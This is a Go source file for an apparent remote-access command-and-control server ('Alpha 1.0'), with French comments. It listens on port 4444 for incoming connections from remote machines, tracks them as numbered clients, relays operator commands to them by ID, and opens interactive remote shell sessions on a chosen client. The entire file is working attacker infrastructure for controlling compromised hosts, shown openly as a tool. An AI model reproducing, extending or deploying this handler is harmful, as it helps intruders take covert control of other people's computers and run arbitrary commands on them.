package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
)

var banner string = "\n\n┏┓┏┓┏┓  ┏┓┏┓\n┗┫ ┫┗┫━━┃ ┏┛     Alpha 1.0\n┗┛┗┛┗┛  ┗┛┗━     github.com/nxvertime"

//var banner string = " ___  ____  ___         ___  ____ \n/ _ \\( __ \\/ _ \\  ___  / __)(___ \\ \n\\__  )(__ (\\__  )(___)( (__  / __/ Alpha 1.0\n(___/(____/(___/       \\___)(____) github.com/nxertime\n"

var emojiMap = map[string]string{
	"listenning": "📡 ",
	"info":       "ℹ️ ",
	"connection": "🎯 ",
	"closed":     "🚪 ",
	"not ok":     "❌ ",
	"ok":         "✔️ ",
	"setting":    "⚙️ ",
	"debug":      "🛠️ ",
	"task":       "🎯 ",
	"alert":      "🔔 ",
	"loading":    "⏳ ",
	"send":       "🚀 ",
	"user":       "🤖 ",
	"error":      "❗ ",
	"help":       "💡 ",
	"input":      "💬 ",
}

// Fonction pour récupérer l'emoji associé à une clé donnée
func getEmoji(key string) string {
	if emoji, ok := emojiMap[key]; ok {
		return emoji
	}
	return "ℹ️" // Emoji par défaut si la clé n'existe pas
}

type Client struct {
	ID      int
	Address string
	Conn    net.Conn
}

var debug = true
var clients = make(map[int]Client)
var clientCounter int
var mutex sync.Mutex
var commandChannel = make(chan string) // Channel pour transmettre les commandes
var inputChannel = make(chan bool)

func main() {
	fmt.Println(banner)
	fmt.Println("========================================")
	server, err := net.Listen("tcp", ":4444")
	if err != nil {
		panic(err)
	}
	defer server.Close()
	fmt.Println(getEmoji("listenning") + "Listening on :4444")
	go switchIptChanState(true)

	go handleCommands() // Une seule goroutine pour lire les commandes du terminal

	for {
		conn, err := server.Accept()
		if err != nil {
			fmt.Println(getEmoji("error")+"Error accepting connection:", err)
			continue
		}

		// Générer un nouvel ID pour chaque client
		mutex.Lock()
		clientCounter++
		clientID := clientCounter
		mutex.Unlock()

		// Ajouter le client à la map
		client := Client{
			ID:      clientID,
			Address: conn.RemoteAddr().String(),
			Conn:    conn,
		}
		mutex.Lock()
		clients[clientID] = client
		mutex.Unlock()

		fmt.Printf(getEmoji("connection")+"New connection from %s\n", conn.RemoteAddr().String())
		go processCli(conn, clientID) // Démarre une goroutine pour chaque client
	}
}

// Cette fonction gère la lecture des commandes et la transmission via un channel
func handleCommands() {
	msg := <-inputChannel
	if msg {
		scanner := bufio.NewScanner(os.Stdin)
		for {

			if scanner.Scan() {
				command := scanner.Text()

				// Ignorer les commandes vides
				if strings.TrimSpace(command) == "" {
					continue
				}

				// Envoyer la commande dans le channel
				commandChannel <- command
			}
		}
	}

}

func processCli(connection net.Conn, clientID int) {
	defer connection.Close()

	for {
		command := <-commandChannel
		if shellActive {
			// Si la session shell est active, ignorer les commandes du serveur
			continue
		}

		parts := strings.SplitN(command, " ", -1)
		switch parts[0] {
		case "focus":
			mutex.Lock()
			client, ok := clients[clientID]
			mutex.Unlock()
			if ok {
				shellSession(client.Conn)
			} else {
				fmt.Printf(getEmoji("not ok")+"Client with ID %d not found\n", clientID)
			}

			shellSession(client.Conn)
		case "list":
			listClients()
			continue
		case "help":
			fmt.Println(getEmoji("help") + "Sure! Here's available commands:")
			fmt.Println("      - help: display this message")
			fmt.Println("      - list: display connected clients")
			fmt.Println("      - focus <client_id>: focusing on one client")
			fmt.Println("      - defocus: de-focusing from current client")
			continue

		default:
			fmt.Println(getEmoji("not ok") + "Invalid command, type help")
		}
		if _, err := strconv.Atoi(parts[0]); err == nil && len(parts) == 2 {

			clientIDStr := parts[0]
			cmd := parts[1]
			//fmt.Println("CLIENT ID STR: " + clientIDStr)
			// Convertir l'ID en entier
			clientID, err := strconv.Atoi(clientIDStr)
			if err != nil {
				fmt.Println(getEmoji("not ok") + "ID de client invalide")
				continue
			}

			mutex.Lock()
			client, ok := clients[clientID]
			mutex.Unlock()
			if ok {
				sendCommand(client.Conn, cmd)
			} else {
				fmt.Printf(getEmoji("not ok")+"Client avec ID %d non trouvé\n", clientID)
			}

		} else {
			fmt.Println(getEmoji("not ok") + "Invalid command format. Use: <client_id> <command>")
			continue

		}

		if len(parts) < 2 {
		}

	}
}

func sendCommand(conn net.Conn, command string) {
	_, err := conn.Write([]byte(command + "\n"))
	if err != nil {
		fmt.Printf(getEmoji("error")+"Erreur lors de l'envoi de la commande : %v\n", err)
	}
}

func listClients() {
	if debug {
		fmt.Println(getEmoji("debug") + "Listing clients...")

	}
	mutex.Lock()
	defer mutex.Unlock()

	if len(clients) == 0 {
		fmt.Println(getEmoji("not ok") + "No clients connected")
		return
	}

	for id, client := range clients {
		fmt.Printf(getEmoji("user")+"ID: %d ADDR: %s\n", id, client.Address)
	}
}

var shellActive = false

func shellSession(conn net.Conn) {
	shellActive = true
	defer func() {
		shellActive = false      // Assurer que l'état est réinitialisé à la fin
		switchIptChanState(true) // Réactiver l'écoute des commandes
	}()

	if debug {
		fmt.Println(getEmoji("debug") + "Starting shell session...")
	}
	defer fmt.Println(getEmoji("debug") + "Closing shell session...")

	_, err := conn.Write([]byte("{\"type\":\"shell_session\"}\n"))
	if err != nil {
		fmt.Printf(getEmoji("error")+"Error while starting shell session : %v\n", err)
		return // Sortir immédiatement si une erreur survient
	}

	switchIptChanState(false) // Désactiver l'écoute des commandes pendant la session shell

	// Lancer une goroutine pour lire la sortie du client
	go func() {
		_, err := io.Copy(os.Stdout, conn)
		if err != nil {
			fmt.Printf(getEmoji("error")+"Error copying output from client: %v\n", err)
		}
	}()

	// Lire les commandes du serveur (terminal) et les envoyer au client
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		command := scanner.Text() + "\n"
		_, err := conn.Write([]byte(command))
		if err != nil {
			fmt.Printf("Erreur lors de l'envoi de la commande : %v\n", err)
			break // Sort de la boucle si une erreur survient
		}
	}

	// Si on sort de la boucle, réactiver l'écoute
	switchIptChanState(true) // S'assurer que l'écoute est réactivée après la session shell
}

func switchIptChanState(state bool) {
	go func() {
		if debug {

			fmt.Println(getEmoji("debug") + "Switching Input Channel state to " + strconv.FormatBool(state) + "...")
		}
		inputChannel <- state

	}()
}
